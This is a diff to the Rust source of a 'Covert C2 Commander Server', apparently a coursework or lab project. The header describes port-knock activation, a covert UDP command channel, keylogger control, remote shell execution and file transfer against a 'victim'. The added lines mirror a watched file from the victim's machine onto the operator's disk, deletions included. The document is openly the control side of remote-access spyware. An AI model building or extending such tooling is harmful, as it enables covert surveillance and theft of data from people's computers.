@@ -1,4 +1,15 @@
 /// Covert C2 Commander Server
+///
+/// Features:
+/// - Menu-driven state machine (Disconnected/Connected)
+/// - Port knock initiation via port_knkr module
+/// - Covert UDP channel for C2 commands
+/// - Keylogger control, shell execution, file transfer
+/// - File watch with Ctrl+C return to menu
+///
+/// Compliance: All protocol data in UDP payload only.
+/// UDP header fields are OS-managed; no transport-layer abuse.
+
 use std::collections::HashMap;
 use std::io::{self, Write};
 use std::net::{Ipv4Addr, IpAddr, SocketAddr, UdpSocket};
@@ -10,6 +21,7 @@ use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3};
 use pnet_datalink as datalink;
 
+// Import modules
 mod port_knkr;
 mod packet;
 
@@ -18,19 +30,23 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
+             PACKET_TYPE_FILE_WATCH,  // ADD THIS
+             FILE_WATCH_UPDATE, FILE_WATCH_DELETE,  // ADD THIS
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
-
+// Configuration
 const BUFFER_SIZE: usize = 4096;
 const MAX_RETRIES: u32 = 3;
 const CHUNK_SIZE: usize = 1024;
 
+// Session state machine
 #[derive(Clone, Copy, PartialEq)]
 enum SessionState {
     Disconnected,
     Connected,
 }
 
+// C2 Commander struct
 pub struct Commander {
     state: SessionState,
     victim_ip: Option<Ipv4Addr>,
@@ -42,8 +58,9 @@ pub struct Commander {
     running: Arc<AtomicBool>,
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
-    file_watch_active: bool,
-    file_watch_path: Option<String>,
+    file_watch_buffer: HashMap<Ipv4Addr, Vec<u8>>,  // ADD THIS
+    file_watch_active: bool,  // ADD THIS
+    file_watch_path: Option<String>,  // ADD THIS
     file_watch_local_path: Option<String>,
 }
 
@@ -60,9 +77,10 @@ impl Commander {
             running: Arc::new(AtomicBool::new(true)),
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
-            file_watch_active: false,
-            file_watch_path: None,
-            file_watch_local_path: None,
+            file_watch_buffer: HashMap::new(),  // ADD THIS
+            file_watch_active: false,  // ADD THIS
+            file_watch_path: None,  // ADD THIS
+            file_watch_local_path: None,  // ADD THIS        
         }
     }
 
@@ -117,7 +135,7 @@ impl Commander {
             println!("\n[CONNECTED] -> {:?}", ip);
         }
         if self.file_watch_active {
-            println!("[*] File watch ACTIVE: {}", self.file_watch_path.as_ref().unwrap_or("unknown"));
+            println!("[*] File watch ACTIVE: {}", self.file_watch_path.as_ref().map_or("unknown", |v| v));
         }
         println!("1) Start Keylogger");
         println!("2) Stop Keylogger");
@@ -329,6 +347,43 @@ impl Commander {
                                 self.keylog_buffer.entry(ip)
                                     .or_insert_with(Vec::new)
                                     .extend_from_slice(payload);
+                            }
+                        }
+                        // ADD THIS - Handle file watch packets
+                        PACKET_TYPE_FILE_WATCH => {
+                            if let Some(ip) = self.victim_ip {
+                                match header.subtype {
+                                    FILE_WATCH_UPDATE => {
+                                        if header.content_length > 0 {
+                                            // Accumulate file data
+                                            self.file_watch_buffer.entry(ip)
+                                                .or_insert_with(Vec::new)
+                                                .extend_from_slice(payload);
+                                        } else {
+                                            // Empty packet = end of update, write to file
+                                            if let Some(local_path) = &self.file_watch_local_path {
+                                                if let Some(data) = self.file_watch_buffer.get(&ip) {
+                                                    let _ = std::fs::write(local_path, data);
+                                                    println!("[*] File updated ({} bytes)", data.len());
+                                                }
+                                            }
+                                            self.file_watch_buffer.remove(&ip);
+                                        }
+                                    }
+                                    FILE_WATCH_DELETE => {
+                                        println!("[!] File deleted on victim");
+                                        // Handle delete (move to deleted folder)
+                                        if let Some(local_path) = &self.file_watch_local_path {
+                                            if let Some(local_filename) = local_path.split('/').last() {
+                                                let timestamp = Instant::now().elapsed().as_secs();
+                                                let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
+                                                let _ = std::fs::rename(local_path, &deleted_path);
+                                            }
+                                        }
+                                        self.file_watch_active = false;
+                                    }
+                                    _ => {}
+                                }
                             }
                         }
                         PACKET_TYPE_HEARTBEAT => {
@@ -565,48 +620,23 @@ impl Commander {
             println!("[+] Initial file saved ({} bytes)", file_data.len());
         }
         
-        // Set watch active flag
+        // Set watch state
         self.file_watch_active = true;
         self.file_watch_path = Some(remote_path.clone());
         self.file_watch_local_path = Some(local_path.clone());
         watch_active.store(true, Ordering::SeqCst);
         
-        println!("[*] Monitoring for file changes (Ctrl+C to stop, returns to menu)...");
+        println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
         let watch_start = Instant::now();
         
-        // Monitor loop - Ctrl+C will set watch_active to false
         while watch_start.elapsed() < Duration::from_secs(600) 
               && self.running.load(Ordering::SeqCst) 
               && watch_active.load(Ordering::SeqCst) {
             self.process_incoming();
-            
-            if let Some(ip) = self.victim_ip {
-                if let Some(data) = self.keylog_buffer.get(&ip) {
-                    if data.len() == 1 && data[0] == 0x72 {
-                        let timestamp = Instant::now().duration_since(watch_start).as_secs();
-                        let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
-                        
-                        if std::path::Path::new(&local_path).exists() {
-                            let _ = std::fs::rename(&local_path, &deleted_path);
-                        }
-                        println!("[!] File deleted on victim");
-                        self.keylog_buffer.remove(&ip);
-                        break;
-                    }
-                    
-                    if !data.is_empty() && data[0] != 0x72 {
-                        match std::fs::write(&local_path, data) {
-                            Ok(_) => println!("[*] File updated ({} bytes)", data.len()),
-                            Err(e) => println!("[!] Failed to save: {}", e),
-                        }
-                        self.keylog_buffer.remove(&ip);
-                    }
-                }
-            }
             thread::sleep(Duration::from_millis(500));
         }
         
-        // Clean up watch state (don't send stop command - let victim continue watching)
+        // Clean up
         self.file_watch_active = false;
         self.file_watch_path = None;
         self.file_watch_local_path = None;
